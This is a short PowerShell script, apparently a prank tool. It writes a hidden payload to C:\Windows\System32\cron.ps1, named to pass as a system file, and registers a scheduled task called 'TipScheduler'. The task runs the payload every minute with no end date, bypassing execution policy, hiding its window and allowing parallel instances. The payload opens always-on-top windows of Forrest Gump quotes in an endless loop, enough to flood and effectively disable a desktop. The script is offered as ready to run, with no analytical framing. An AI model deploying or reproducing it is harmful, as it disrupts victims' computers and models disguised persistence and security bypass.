$Script = @"
`$Tips = @(
    "Life is like a box of chocolates; you never know what you're gonna get.",
    "Stupid is as stupid does.",
    "My Mama always said you've got to put the past behind you before you can move on.",
    "You have to do the best with what God gave you.",
    "Miracles happen every day. Just believe."
)

while (`$True) {
    `Add-Type -AssemblyName System.Windows.Forms
    `$woot = New-Object system.Windows.Forms.Form
    `$woot.Text = `$Tips | Get-Random
    `$woot.TopMost = $True
    `$woot.BackgroundImage = [system.drawing.image]::FromFile("C:\Windows\System32\dns.gif")
    `$woot.Width = 800
    `$woot.Height = 435
    `[void]$woot.Show()    
}
"@

$ScriptPath = "C:\Windows\System32\cron.ps1"
$TaskName = "TipScheduler"

$Script | Out-File $ScriptPath -Encoding ASCII

$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -NoExit -File $ScriptPath"
$Trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 1) -RepetitionDuration ([System.TimeSpan]::MaxValue)
$Settings = New-ScheduledTaskSettingsSet -DontStopIfGoingOnBatteries -AllowStartIfOnBatteries -ExecutionTimeLimit (New-TimeSpan -Hours 24) -StartWhenAvailable -MultipleInstances Parallel -Priority 3
$Task = Register-ScheduledTask -Action $Action -Trigger $Trigger -TaskName $TaskName -Settings $Settings

Write-Output "Mama's Tips scheduled task created."
